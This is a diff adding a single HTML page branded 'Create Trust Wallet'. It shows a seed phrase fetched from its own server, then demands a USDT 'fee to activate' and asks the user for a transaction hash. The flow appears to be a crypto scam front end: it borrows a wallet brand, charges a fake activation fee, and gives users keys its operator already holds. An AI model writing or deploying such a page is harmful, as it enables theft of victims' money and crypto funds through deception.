@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trust Wallet Generator</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+
+    <div class="bg-white shadow-lg rounded-lg p-8 max-w-md w-full text-center">
+        <h1 class="text-2xl font-bold mb-4">Create Trust Wallet</h1>
+        <button id="createWalletBtn" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded">
+            Create Wallet
+        </button>
+        <div id="status" class="text-gray-600 mt-4"></div>
+        <div id="secretPhrase" class="text-red-600 font-mono mt-4"></div>
+
+        <button id="continueBtn" class="bg-green-500 hover:bg-green-700 text-white font-bold py-2 px-4 rounded mt-4 hidden">
+            Continue
+        </button>
+
+        <div id="usdtAddress" class="text-blue-600 font-mono mt-4 hidden"></div>
+
+        <input type="text" id="transactionHash" placeholder="Enter Transaction Hash"
+            class="mt-4 px-4 py-2 border rounded w-full hidden"/>
+        <button id="checkBtn" class="bg-purple-500 hover:bg-purple-700 text-white font-bold py-2 px-4 rounded mt-4 hidden">
+            Check
+        </button>
+    </div>
+
+    <script>
+        document.getElementById('createWalletBtn').addEventListener('click', async () => {
+            document.getElementById('status').innerText = 'Creating...';
+            const res = await fetch('/api/create-wallet');
+            const data = await res.json();
+            setTimeout(() => {
+                document.getElementById('status').innerText = 'Wallet Created!';
+                document.getElementById('secretPhrase').innerText = data.mnemonic;
+                document.getElementById('continueBtn').classList.remove('hidden');
+            }, 2000);
+        });
+
+        document.getElementById('continueBtn').addEventListener('click', async () => {
+            document.getElementById('continueBtn').classList.add('hidden');
+            document.getElementById('status').innerText = 'Pay Fee to Activate';
+            const res = await fetch('/api/get-usdt-address');
+            const data = await res.json();
+            document.getElementById('usdtAddress').innerText = 'USDT Address: ' + data.address;
+            document.getElementById('usdtAddress').classList.remove('hidden');
+            document.getElementById('transactionHash').classList.remove('hidden');
+            document.getElementById('checkBtn').classList.remove('hidden');
+        });
+    </script>
+</body>
+</html>
